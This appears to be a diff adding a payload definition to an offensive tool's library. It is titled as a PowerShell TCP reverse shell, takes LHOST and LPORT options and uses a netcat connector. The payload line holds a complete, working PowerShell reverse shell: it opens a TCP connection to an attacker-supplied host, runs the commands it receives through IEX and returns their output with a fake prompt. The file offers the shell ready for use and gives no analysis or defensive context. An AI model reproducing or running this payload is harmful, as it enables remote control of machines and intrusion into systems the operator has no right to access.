@@ -1,0 +1,5 @@
+title=Powershell TCP reverse shell payload
+info=No extra info required
+required_opts=LHOST;LPORT
+connector=reverse_tcp_netcat
+payload=$c = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$st = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $st.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (IEX $d 2>&1 | Out-String ); $sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sby = ([text.encoding]::ASCII).GetBytes($sb2); $st.Write($sby,0,$sby.Length);$st.Flush()};$c.Close()
